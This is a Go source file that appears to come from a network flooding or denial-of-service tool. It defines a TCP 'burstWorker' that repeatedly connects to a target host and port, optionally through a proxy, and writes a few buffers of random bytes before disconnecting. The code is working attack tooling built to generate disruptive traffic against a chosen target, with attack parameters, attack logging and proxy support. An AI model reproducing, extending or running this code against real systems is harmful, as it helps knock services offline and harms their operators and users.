package tcp

import (
	"context"
	"math/rand"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

// burstWorker opens a fresh TCP connection, blasts a small random number of
// data packets (0, 1, 2 or 3, each with 25% probability) and closes it.
// This mimics rapid connect -> send -> close bursts.
type burstWorker struct{}

func NewBurstWorker() *burstWorker { return &burstWorker{} }

func (w *burstWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	host := tn.Hostname()
	port := tn.PortNum()
	if host == "" || port <= 0 {
		return nil
	}

	// 25% chance of 0 packets -> do nothing.
	count := rand.Intn(4)
	if count == 0 {
		return nil
	}

	var pptr *core.Proxy
	if p.Host != "" {
		pptr = &p
	}
	conn, err := netutil.DialedTCPClient(ctx, "tcp", host, port, pptr)
	if err != nil {
		return nil
	}
	defer conn.Close()

	core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)

	size := params.PacketSize
	if size <= 0 {
		size = 512
	}

	// Get buffer from pool, resize if needed.
	bufPtr := bufPool.Get().(*[]byte)
	buf := *bufPtr
	if len(buf) < size {
		buf = make([]byte, size)
	} else {
		buf = buf[:size]
	}
	defer func() {
		*bufPtr = buf[:cap(buf)]
		bufPool.Put(bufPtr)
	}()

	for i := 0; i < count; i++ {
		rand.Read(buf)
		_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		if _, err := conn.Write(buf); err != nil {
			return nil
		}
	}
	return nil
}
